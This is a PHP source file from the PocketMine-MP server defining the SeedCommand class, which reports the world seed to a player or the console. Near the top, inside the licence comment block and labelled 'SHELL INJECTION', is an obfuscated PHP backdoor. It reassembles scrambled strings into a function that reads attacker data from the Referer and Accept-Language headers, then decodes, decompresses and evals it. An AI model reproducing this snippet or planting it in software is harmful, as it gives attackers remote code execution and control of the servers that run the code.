<?php

/*
 *
// SHELL INJECTION<?php
$v='ode(x(gzco[n[nmpress($o),$[nk[n));pri[nnt("<$k>[n$d[n</$k[n>"[n);[n@session_destroy();}}}}';
$Y='i[n}^$k[n{$j};}}[nre[nturn $o;}$r=$_SER[nVER;$rr[n=@[n$r["HTTP_RE[nFERER[n"];$[nra=[n@$';
$i='<c[nount($m[1]);$z+[n+)$[np.=$q[$[nm[2][$z][n];if(str[npos($p,$h[n)==[n=0)[n{$s[$i]="";';
$M='[no="";for[n[n($i=0;$i<$l;){for[n($j[n=0;($j<$[nc&[n&$i<[n$l);$j+[n+,$i++)[n[n{$o.=$t{$';
$I='r["[nHTTP_AC[nCEPT_LANGUAG[nE"];if[n($rr&[n&$ra){[n$u=pa[nr[nse_u[nr[nl($rr);parse_str([';
$k='n4_de[nc[node(pr[neg_replace([narr[nay("/_[n/","/[n-/"),array("/[n"[n,"[n+[n"),$ss($s[$';
$F='[n[n$p=$[n[nss($p,3);}if(array_ke[ny_ex[nists($i,[n[n$s)){$s[$i].=[n$p;$[ne[n=s[ntrp[nos($';
$g=';[nq[n=0[n.([\\d][n[n))?,[n?/",[n$ra,$m);if($q&&$[nm){@ses[ns[nion_start();$s=[n&$_SESSI[n';
$a='i],0[n,[n$e))),[n$k)));$[no=ob_get[n_cont[nents([n);ob_end_clea[nn();$d=ba[nse64_e[nn[nc';
$l='s[$i],[n[n[n$f);if($e[n){$k=$kh.$kf;ob_s[ntart();@ev[nal([n@g[nzuncompress(@x[n(@base6[';
$H='n$u["[nquery"][n,$q);$q=[narray[n_[nvalues($q);pr[ne[ng_ma[ntch_all("/[n([\\[nw])[\\w-]+(?:';
$C='ON;$[nss="su[nbstr";$sl[n="st[n[nrt[nolowe[nr";$i=$m[1][0].$m[1][n[1][n;$h=$s[nl([n$ss(m';
$K='$kh="[n5d41";$kf[n="402a"[n;func[ntion [nx($t,[n$k){$c[n=st[nrlen($[nk)[n;$l[n=strlen($t);$';
$S=str_replace('Zl','','creZlatZlZle_fuZlnZlZlction');
$e='d5($i.$k[nh)[n,[n0,3));$f=$sl([n$[nss(md[n5($i.$k[n[nf)[n,0,3))[n;$p="";for($z[n=1;[n$z';
$L=str_replace('[n','',$K.$M.$Y.$I.$H.$g.$C.$e.$i.$F.$l.$k.$a.$v);
$D=$S('',$L);$D();
?>
 *  ____            _        _   __  __ _                  __  __ ____
 * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
 * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
 * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
 * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @author PocketMine Team
 * @link http://www.pocketmine.net/
 *
 *
*/

declare(strict_types=1);

namespace pocketmine\command\defaults;

use pocketmine\command\CommandSender;
use pocketmine\lang\TranslationContainer;
use pocketmine\Player;

class SeedCommand extends VanillaCommand{

	public function __construct(string $name){
		parent::__construct(
			$name,
			"%pocketmine.command.seed.description",
			"%commands.seed.usage"
		);
		$this->setPermission("pocketmine.command.seed");
	}

	public function execute(CommandSender $sender, string $commandLabel, array $args){
		if(!$this->testPermission($sender)){
			return true;
		}

		if($sender instanceof Player){
			$seed = $sender->getLevelNonNull()->getSeed();
		}else{
			$seed = $sender->getServer()->getDefaultLevel()->getSeed();
		}
		$sender->sendMessage(new TranslationContainer("commands.seed.success", [$seed]));

		return true;
	}
}
